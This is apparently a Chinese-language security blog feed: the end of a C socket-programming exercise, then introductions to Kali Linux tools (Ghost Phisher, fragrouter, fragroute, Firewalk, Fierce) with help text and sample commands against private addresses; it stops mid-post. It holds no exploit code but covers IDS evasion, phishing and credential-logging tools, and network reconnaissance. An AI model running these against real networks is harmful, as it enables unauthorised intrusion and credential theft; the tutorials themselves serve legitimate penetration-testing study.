class="line">    server.sin_family=AF_INET;</div><div class="line">    server.sin_port=htons(PORT);</div><div class="line">    server.sin_addr=*((struct in_addr*)remote_host-&gt;h_addr);</div><div class="line"></div><div class="line">    <span class="keyword">if</span>((connect(socketfd,(struct sockaddr*)&amp;server,<span class="keyword">sizeof</span>(server)))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">        perror(<span class="string">"connect() error."</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ((recv(socketfd,wel,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">    &#123;</div><div class="line">    	perror(<span class="string">"[!] Receive welcome message fail."</span>);</div><div class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    wel[<span class="keyword">sizeof</span>(wel)<span class="number">-1</span>]=<span class="string">'\0'</span>;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, wel);</div><div class="line"></div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[*] Input string:"</span>);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;send_buf);</div><div class="line">        send_buf[<span class="built_in">strlen</span>(send_buf)]=<span class="string">'\0'</span>;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((<span class="built_in">strlen</span>(send_buf))&gt;<span class="number">100</span>)</div><div class="line">        &#123;</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"[!] Only supports sending fewer than 100 characters."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((send_num=send(socketfd,send_buf,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"send() error."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>((recv_num=recv(socketfd,recv_buf,MAXDATASIZE,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">        &#123;</div><div class="line">            perror(<span class="string">"recv() error."</span>);</div><div class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"[&gt;] Received reverse string:%s\n"</span>,recv_buf);</div><div class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(recv_buf,<span class="string">"tiuq"</span>))</div><div class="line">        &#123;</div><div class="line">            close(socketfd);</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    close(socketfd);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure><h2 id="0x02-演示"><a href="#0x02-演示" class="headerlink" title="0x02 演示"></a>0x02 演示</h2><p><strong>服务端：</strong></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/1647111430.png" alt="Linux C socket programming practice of the TCP socket server demonstration.png"></p><p><strong>客户端：</strong></p><p><img src="https://www.hackfun.org/usr/uploads/2016/11/2929746852.png" alt="Linux C socket programming practice of the TCP socket client demonstration.png"></p><h2 id="0x03-心得"><a href="#0x03-心得" class="headerlink" title="0x03 心得"></a>0x03 心得</h2><p>在编写代码时一定注意程序的逻辑，先做什么，再做什么，同时要注意服务端和客户端的处理同步。在调用函数时要注意传入的参数类型的一致性以及函数返回值的类型，还有调用bind、accept、connect函数是要注意把server，client的sockaddr_in套接字地址结构强制转化为通用套接字地址结构sockaddr，类似：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bindfd=bind(socketfd,(struct sockaddr *)&amp;server,<span class="keyword">sizeof</span>(server))</div></pre></td></tr></table></figure><p>中的<code>(struct sockaddr *)&amp;server</code>。还要注意一个坑，在服务端accept函数的第一个参数必须是socket函数产生的套接字描述符，在本例正确的写法是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="keyword">if</span>((socketfd=socket(AF_INET,SOCK_STREAM,<span class="number">0</span>))==<span class="number">-1</span>)</div><div class="line">...</div><div class="line"><span class="keyword">if</span>((connectfd=accept(socketfd,(struct sockaddr *)&amp;client,&amp;addrlen))==<span class="number">-1</span>)</div><div class="line">...</div></pre></td></tr></table></figure><p>如果你像我一开始写成：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>((connectfd=accept(listenfd,(struct sockaddr *)&amp;client,&amp;addrlen))==<span class="number">-1</span>)</div></pre></td></tr></table></figure><p>就会报类似的错误：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">accept() error.: Socket operation on non-socke</div></pre></td></tr></table></figure><p></p><p>原因是虽然socket()、bind()、listen()、accept()等函数返回的值都是int类型的，但是socket()返回值的意义和其他的函数返回值却不相同，socket()返回的是一个套接字描述符，而其他函数调用成功返回0，出错返回-1，并置errno值，所以要注意这个区别。<br>另外在判断字符是否相同不要用”==”等号去判断：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(send_buf==<span class="string">"tiuq"</span>)</div></pre></td></tr></table></figure><p></p><p>而是最好使用strcmp()函数：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(send_buf,<span class="string">"tiuq"</span>))</div></pre></td></tr></table></figure><p></p><p>要不然而出现类似的警告：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">warning: comparison with string literal results in unspecified behavior [-Waddress]</div></pre></td></tr></table></figure><p></p><p>虽然不会出现error，但是你懂的，处女座( •̀ ω •́ )y<br>在拷贝字符串数组不要错误地使用”=”去赋值：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">send_buf[MAXDATASIZE]=recv_buf[MAXDATASIZE];</div></pre></td></tr></table></figure><p></p><p>正确的方法是使用strcpy()函数：<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">strcpy</span>(send_buf,recv_buf);</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 学习记录 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> tcp socket </tag>
            
            <tag> socket programming </tag>
            
            <tag> tcp套接字 </tag>
            
            <tag> c </tag>
            
            <tag> socket编程练习 </tag>
            
            <tag> c语言 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集无线攻击之Ghost Phisher]]></title>
      <url>/2016/10/25/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB%E4%B9%8BGhost-Phisher/</url>
      <content type="html"><![CDATA[<h2 id="0x00-Ghost-Phisher介绍"><a href="#0x00-Ghost-Phisher介绍" class="headerlink" title="0x00 Ghost Phisher介绍"></a>0x00 Ghost Phisher介绍</h2><p>Ghost Phisher是一个使用Python编程语言和Python Qt GUI库编写的无线和以太网安全审计和攻击程序，可以伪造DNS服务器、DHCP服务器、HTTP服务器并且内置自动抓取和记录认证信息的功能模块。这个程序可用于制作蜜罐，也可用于钓鱼（安全测试）的相关工作。</p><p>Ghost Phisher目前支持以下功能：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">HTTP服务器</div><div class="line">内置RFC 1035 DNS服务器</div><div class="line">内置RFC 2131 DHCP服务器</div><div class="line">网页托管和凭证记录器（网络钓鱼）</div><div class="line">Wifi接入点模拟器</div><div class="line">会话劫持（被动和以太网模式）</div><div class="line">ARP缓存欺骗（用于MITM和DOS攻击）</div><div class="line">使用绑定的Metasploit进行渗透</div><div class="line">使用SQlite数据库进行自动凭证日志记录</div><div class="line">更新支持</div></pre></td></tr></table></figure><p></p><p>工具来源：<a href="https://code.google.com/p/ghost-phisher/" target="_blank" rel="external">https://code.google.com/p/ghost-phisher/</a></p><p><a href="https://code.google.com/p/ghost-phisher/" target="_blank" rel="external">Ghost Phisher主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/ghost-phisher.git;a=summary" target="_blank" rel="external">Kali Ghost Phisher Repo仓库</a></p><ul><li><p>作者：Saviour Emmanuel Ekiko</p></li><li><p>证书：GPLv3</p></li></ul><h2 id="0x01-Ghost-Phisher功能"><a href="#0x01-Ghost-Phisher功能" class="headerlink" title="0x01 Ghost Phisher功能"></a>0x01 Ghost Phisher功能</h2><p>ghost-phisher - 用于网络钓鱼和渗透攻击的图形用户界面套件</p><a id="more"></a><h2 id="0x02-Ghost-Phisher用法示例"><a href="#0x02-Ghost-Phisher用法示例" class="headerlink" title="0x02 Ghost Phisher用法示例"></a>0x02 Ghost Phisher用法示例</h2><p>YouTube：<a href="https://www.youtube.com/watch?v=QpMZXp1NryE" target="_blank" rel="external">How to create fake wifi hotspot (ghost phisher) using kali linux 2</a><br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~# ghost-phisher</div></pre></td></tr></table></figure><p></p><p><img src="https://www.hackfun.org/usr/uploads/2016/10/690577029.gif" alt="ghost-phisher.gif"></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> wireless attacks </tag>
            
            <tag> ghost phisher </tag>
            
            <tag> 无线攻击 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之fragrouter]]></title>
      <url>/2016/10/25/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bfragrouter/</url>
      <content type="html"><![CDATA[<h2 id="0x00-fragrouter介绍"><a href="#0x00-fragrouter介绍" class="headerlink" title="0x00 fragrouter介绍"></a>0x00 fragrouter介绍</h2><p>fragrouter是一个具有路由器功能的应用程序，它能够对攻击者发送的攻击流量进行分片处理之后，向攻击目标转发。</p><p>工具来源：fragrouter README</p><p><a href="http://www.anzen.com/research/nidsbench/fragrouter.html" target="_blank" rel="external">fragrouter主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/fragrouter.git;a=summary" target="_blank" rel="external">Kali fragrouter Repo仓库</a></p><ul><li><p>作者：Dug Song, Anzen Computing</p></li><li><p>证书：GPLv2</p></li></ul><h2 id="0x01-fragrouter功能"><a href="#0x01-fragrouter功能" class="headerlink" title="0x01 fragrouter功能"></a>0x01 fragrouter功能</h2><p>fragrouter - 入侵检测系统(IDS)逃避工具包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">root@kali:~# fragrouter</div><div class="line">版本：1.6</div><div class="line">用法：fragrouter [-i interface] [-p] [-g hop] [-G hopcount] ATTACK</div><div class="line"></div><div class="line">其中ATTACK是以下之一：</div><div class="line"></div><div class="line">-B1：base-1：正常的IP转发</div><div class="line">-F1：frag-1：有序的8字节IP分片</div><div class="line">-F2：frag-2：有序的24字节IP分片</div><div class="line">-F3：frag-3：有序的8字节IP分片，一个失序</div><div class="line">-F4：frag-4：有序的8字节IP分片，一个重复</div><div class="line">-F5：frag-5：无序的8字节片段，一个重复</div><div class="line">-F6：frag-6：有序的8字节片段，标记最后一个Frag</div><div class="line">-F7：frag-7：有序的16字节片段，fwd重写</div><div class="line">-T1：tcp-1：3-whs，错误TCP校验和和FIN/RST，有序的1字节段</div><div class="line">-T3：tcp-3：3-whs，有序的1字节段，一个重复</div><div class="line">-T4：tcp-4：3-whs，有序的1字节段，一次重写</div><div class="line">-T5：tcp-5：3-whs，有序的2字节段，fwd重写</div><div class="line">-T7：tcp-7：3-whs，有序的1字节段，交织空段</div><div class="line">-T8：tcp-8：3-whs，有序的1字节段，一个失序</div><div class="line">-T9：tcp-9：3-whs，无序的1字节段</div><div class="line">-C2：tcbc-2：3-whs，有序的1字节段，交织的SYN</div><div class="line">-C3：tcbc-3：有序的1字节空段，3-whs，有序的1字节段</div><div class="line">-R1：tcbt-1：3-whs，RST，3-whs，有序的1字节段</div><div class="line">-I2：ins-2：3-whs，有序的1字节段，错误TCP校验和</div><div class="line">-I3：ins-3：3-whs，有序的1字节段，不设置ACK</div><div class="line">-M1：misc-1：Windows NT 4 SP2 - http://www.dataprotect.com/ntfrag/</div><div class="line">-M2：misc-2：Linux IP chain - http://www.dataprotect.com/ipchains/</div></pre></td></tr></table></figure><h2 id="0x02-fragrouter用法示例"><a href="#0x02-fragrouter用法示例" class="headerlink" title="0x02 fragrouter用法示例"></a>0x02 fragrouter用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@kali:~# fragrouter -i eth0 -F1</div><div class="line">fragrouter: frag-1: ordered 8-byte IP fragments</div><div class="line">...</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> recon </tag>
            
            <tag> evasion </tag>
            
            <tag> fragrouter </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之fragroute]]></title>
      <url>/2016/10/24/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8Bfragroute/</url>
      <content type="html"><![CDATA[<h2 id="0x00-fragroute介绍"><a href="#0x00-fragroute介绍" class="headerlink" title="0x00 fragroute介绍"></a>0x00 fragroute介绍</h2><p>Fragroute能够截取、修改和重写向外发送的报文，实现了大部分的IDS攻击功能。Fragroute起重要作用的是一个简单的规则设置语言，以它去实现延迟、复制、丢弃、碎片、重叠、打印、重排、分割、源路由或其他一些向目标主机发送数据包的攻击。这个工具开发的本意是去测试入侵检测系统、防火墙、基本的TCP/IP堆栈的行为。</p><p>该工具是为了帮助测试网络入侵检测系统，防火墙和基本TCP/IP堆栈行为而编写的，请不要滥用此软件！</p><p>工具来源：<a href="http://www.monkey.org/~dugsong/fragroute/" target="_blank" rel="external">http://www.monkey.org/~dugsong/fragroute/</a></p><p><a href="http://www.monkey.org/~dugsong/fragroute/" target="_blank" rel="external">fragroute主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/fragroute.git;a=summary" target="_blank" rel="external">Kali fragroute Repo仓库</a></p><ul><li>作者：Dug Song</li><li>证书：3-Clause BSD</li></ul><h2 id="0x01-fragroute功能"><a href="#0x01-fragroute功能" class="headerlink" title="0x01 fragroute功能"></a>0x01 fragroute功能</h2><p>fragroute - 通过尝试规避使用分段数据包来测试NIDS<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">root@kali:~# fragroute</div><div class="line">Usage: fragroute [-f file] dst</div><div class="line">Rules:</div><div class="line">       delay first|last|random &lt;ms&gt;</div><div class="line">       drop first|last|random &lt;prob-%&gt;</div><div class="line">       dup first|last|random &lt;prob-%&gt;</div><div class="line">       echo &lt;string&gt; ...</div><div class="line">       ip_chaff dup|opt|&lt;ttl&gt;</div><div class="line">       ip_frag &lt;size&gt; [old|new]</div><div class="line">       ip_opt lsrr|ssrr &lt;ptr&gt; &lt;ip-addr&gt; ...</div><div class="line">       ip_ttl &lt;ttl&gt;</div><div class="line">       ip_tos &lt;tos&gt;</div><div class="line">       order random|reverse</div><div class="line">       print</div><div class="line">       tcp_chaff cksum|null|paws|rexmit|seq|syn|&lt;ttl&gt;</div><div class="line">       tcp_opt mss|wscale &lt;size&gt;</div><div class="line">       tcp_seg &lt;size&gt; [old|new]</div></pre></td></tr></table></figure><p></p><h2 id="0x02-fragtest功能"><a href="#0x02-fragtest功能" class="headerlink" title="0x02 fragtest功能"></a>0x02 fragtest功能</h2><p>fragtest - 通过尝试规避使用分段数据包来测试NIDS</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">root@kali:~# fragtest</div><div class="line">用法: fragtest TESTS ... &lt;host&gt;</div><div class="line">   其中TESTS是以下（或“全部”）的任意组合：</div><div class="line"></div><div class="line">   ping         所有测试的先决条件</div><div class="line">   ip-opt       确定支持的IP选项（BROKEN）</div><div class="line">   ip-tracert   确定目标的路径</div><div class="line">   frag         尝试8字节的IP分片</div><div class="line">   frag-new     尝试8字节fwd重叠的IP分片，有利于新数据（BROKEN）</div><div class="line">   frag-old     尝试8字节fwd重叠的IP分片，有利于旧数据</div><div class="line">   frag-timeout 确定IP片段重组超时（BROKEN）</div></pre></td></tr></table></figure><h2 id="0x03-fragroute用法示例"><a href="#0x03-fragroute用法示例" class="headerlink" title="0x03 fragroute用法示例"></a>0x03 fragroute用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@kali:~# fragroute 192.168.1.123</div><div class="line">fragroute: tcp_seg -&gt; ip_frag -&gt; ip_chaff -&gt; order -&gt; print</div><div class="line">172.16.79.182.53735 &gt; 192.168.1.123.80: S 617662291:617662291(0) win 29200</div></pre></td></tr></table></figure><h2 id="0x05-fragtest用法示例"><a href="#0x05-fragtest用法示例" class="headerlink" title="0x05 fragtest用法示例"></a>0x05 fragtest用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:~# fragtest ip-tracert frag-new 192.168.1.123</div><div class="line">ip-tracert: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> fragroute </tag>
            
            <tag> evasion </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之Firewalk]]></title>
      <url>/2016/10/24/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BFirewalk/</url>
      <content type="html"><![CDATA[<h2 id="0x00-Firewalk介绍"><a href="#0x00-Firewalk介绍" class="headerlink" title="0x00 Firewalk介绍"></a>0x00 Firewalk介绍</h2><p>Firewalk是一个主动的侦察网络安全工具，试图确定给定的IP转发设备将通过哪些第4层协议。Firewalk通过发送具有比目标网关更大的TTL的TCP或UDP数据包来工作。如果网关允许流量，则它将将分组转发到它们将到期的下一跳，并且引出ICMP_TIME_EXCEEDED消息。如果网关主机不允许流量，它可能会丢弃在那层上的数据包，我们将看不到响应。</p><p>要获得正确的IP TTL，将导致过期的数据包超出网关，我们需要增加跳数。我们以跟踪traceroute工作的同样方式做，一旦我们有网关跳转计数（在那一点扫描被称为“绑定”），我们可以开始我们的扫描。</p><p>重要的是注意到不必达到最终目的地主机的事实，它只需要在扫描主机的网关的下游。</p><p>更多介绍：<a href="http://www.enet.com.cn/article/2011/0411/A20110411847512.shtml" target="_blank" rel="external">Firewalk:高级路由跟踪工具(Linux)</a></p><p>工具来源：<a href="http://packetfactory.openwall.net/projects/firewalk/" target="_blank" rel="external">http://packetfactory.openwall.net/projects/firewalk/</a></p><p><a href="http://packetfactory.openwall.net/projects/firewalk/" target="_blank" rel="external">Firewalk主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/firewalk.git;a=summary" target="_blank" rel="external">Kali Firewalk Repo仓库</a></p><ul><li><p>作者：Mike D. Schiffman, David Goldsmith</p></li><li><p>证书：BSD</p></li></ul><h2 id="0x01-Firewalk功能"><a href="#0x01-Firewalk功能" class="headerlink" title="0x01 Firewalk功能"></a>0x01 Firewalk功能</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">root@kali:~# firewalk -h</div><div class="line">Firewalk 5.0 [gateway ACL scanner]</div><div class="line">用法：firewalk [options] target_gateway metric</div><div class="line">            [-d 0-65535] 要使用的目标端口（斜坡阶段）</div><div class="line">            [-h] 程序帮助</div><div class="line">            [-i device] 接口</div><div class="line">            [-n] 不会将IP地址解析到主机名中</div><div class="line">            [-p TCP|UDP] 协议</div><div class="line">            [-r] 严格遵守RFC</div><div class="line">            [-S x-y，z] 端口范围进行扫描</div><div class="line">            [-s 0-65535] 源端口</div><div class="line">            [-T 1-1000] 数据包读取超时（以毫秒为单位）</div><div class="line">            [-t 1-25] IP生存时间</div><div class="line">            [-v] 程序版本</div><div class="line">            [-x 1-8] 预期向量</div></pre></td></tr></table></figure><h2 id="0x02-Firewalk用法示例"><a href="#0x02-Firewalk用法示例" class="headerlink" title="0x02 Firewalk用法示例"></a>0x02 Firewalk用法示例</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">root@kali:~# firewalk -S 8079-8081  -i eth0 -n -p TCP 192.168.1.1 192.168.0.1</div><div class="line">Firewalk 5.0 [gateway ACL scanner]</div><div class="line">Firewalk state initialization completed successfully.</div><div class="line">TCP-based scan.</div><div class="line">Ramping phase source port: 53, destination port: 33434</div><div class="line">Hotfoot through 192.168.1.1 using 192.168.0.1 as a metric.</div><div class="line">Ramping Phase:</div><div class="line"> 1 (TTL  1): expired [192.168.1.1]</div><div class="line">Binding host reached.</div><div class="line">Scan bound at 2 hops.</div><div class="line">Scanning Phase:</div><div class="line">port 8079: *no response*</div><div class="line">port 8080: A! open (port not listen) [192.168.0.1]</div><div class="line">port 8081: *no response*</div><div class="line"></div><div class="line">Scan completed successfully.</div><div class="line"></div><div class="line">Total packets sent:                4</div><div class="line">Total packet errors:               0</div><div class="line">Total packets caught               2</div><div class="line">Total packets caught of interest   2</div><div class="line">Total ports scanned                3</div><div class="line">Total ports open:                  1</div><div class="line">Total ports unknown:               0</div></pre></td></tr></table></figure><h2 id="0x02-提示"><a href="#0x02-提示" class="headerlink" title="0x02 提示"></a>0x02 提示</h2><p>新版Kali已移除Firewalk，如果你需要安装Firewalk可以使用以下命令：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:~# apt-get update</div><div class="line">root@kali:~# apt-get install firewalk</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> 神兵利器 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> kali linux </tag>
            
            <tag> information gathering </tag>
            
            <tag> 信息收集 </tag>
            
            <tag> recon </tag>
            
            <tag> 路由跟踪工具 </tag>
            
            <tag> firewalk </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Kali Linux信息收集之Fierce]]></title>
      <url>/2016/10/24/Kali-Linux%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BFierce/</url>
      <content type="html"><![CDATA[<h2 id="0x00-Fierce介绍"><a href="#0x00-Fierce介绍" class="headerlink" title="0x00 Fierce介绍"></a>0x00 Fierce介绍</h2><p>首先Fierce不是一个IP扫描器，也不是一个DDoS工具，更不是设计为扫描整个互联网或执行任何非目标攻击的工具。 这意味着专门用于在公司网络内部和外部设定可能的目标。 仅列出这些目标（除非使用-nopattern开关），不执行任何利用（除非您使用-connect开关执行有意恶意的操作）。 Fierce是一种用于侦察的PERL脚本工具，它能使用几种策略快速扫描域（通常只需几分钟，在没有网络延迟的情况下）。</p><p>工具来源：<a href="http://ha.ckers.org/fierce/" target="_blank" rel="external">http://ha.ckers.org/fierce/</a></p><p><a href="http://ha.ckers.org/fierce/" target="_blank" rel="external">Fierce主页</a> | <a href="http://git.kali.org/gitweb/?p=packages/fierce.git;a=summary" target="_blank" rel="external">Kali Fierce Repo仓库</a></p><ul><li><p>作者：RSnake</p></li><li><p>证书：GPLv2</p></li></ul><h2 id="0x01-Fierce功能"><a href="#0x01-Fierce功能" class="headerlink" title="0x01 Fierce功能"></a>0x01 Fierce功能</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line">root@kali:~# fierce -h</div><div class="line">fierce.pl (C) Copywrite 2006,2007 - By RSnake at http://ha.ckers.org/fierce/</div><div class="line"></div><div class="line">    用法：perl fierce.pl [-dns example.com] [选项]</div><div class="line"></div><div class="line">概述：</div><div class="line">    Fierce是一种半轻量级扫描器，可帮助根据指定的域定位不连续的IP空间和主机名。确切的说是fierce扫描结果作为nmap，unicornscan，nessus，nikto等工具的输入，因为所有这些工具要求你已经知道你正在寻找什么IP空间。fierce不会不加区分地执行攻击和扫描整个互联网。这意味着它专门用于在公司网络内部和外部定位可能的目标。因为它主要使用DNS，你经常会发现因为错误地配置网络从而泄漏内部地址空间，这在定向恶意软件中特别有用。</div><div class="line"></div><div class="line">选项：</div><div class="line">    -connect    尝试用http方式连接到任何非RFC1918(公共)地址。这将输出返回headers信息，但请注意，对于一个有很多目 </div><div class="line">                标的公司可能需要很长时间，取决于网络/机器的延迟，我不建议这样做，除非它是一个小公司或你有很多空闲时</div><div class="line">                间（可能需要几个小时）。在指定的文件内，文本"Host:\n"将被指定的主机替换。用法：</div><div class="line"></div><div class="line">    perl fierce.pl -dns example.com -connect headers.txt</div><div class="line"></div><div class="line">    -delay       查找之间等待的秒数</div><div class="line">    -dns         要扫描的域</div><div class="line">    -dnsfile     使用文件中提供的DNS服务器（每行一个）进行反向查找（穷举模式）</div><div class="line">    -dnsserver   使用特定的DNS服务器进行反向查找（可能应该是目标的DNS服务器），Fierce使用您的DNS服务器进行初始SOA                   </div><div class="line">                 查询，然后默认情况下将目标的DNS服务器用于所有其他查询</div><div class="line">    -file        您要输出以便记录到的文件</div><div class="line">    -fulloutput  当与-connect结合使用时，将输出Web服务器发回的所有内容，而不仅仅是HTTP头</div><div class="line">    -help        此屏幕的帮助信息</div><div class="line">    -nopattern   在查找附近的主机时不要使用搜索模式，而是转储一切，这可能有点烦，但对于查找垃圾邮件制造者可能正在使   </div><div class="line">                 用的其他域很有用，它也可能会给你很多误报，特别是扫描在大型域时</div><div class="line">    -range       扫描内部IP范围（必须与-dnsserver组合）。注意，这不支持正则，只会简单地输出它找到的东西。用法：</div><div class="line"></div><div 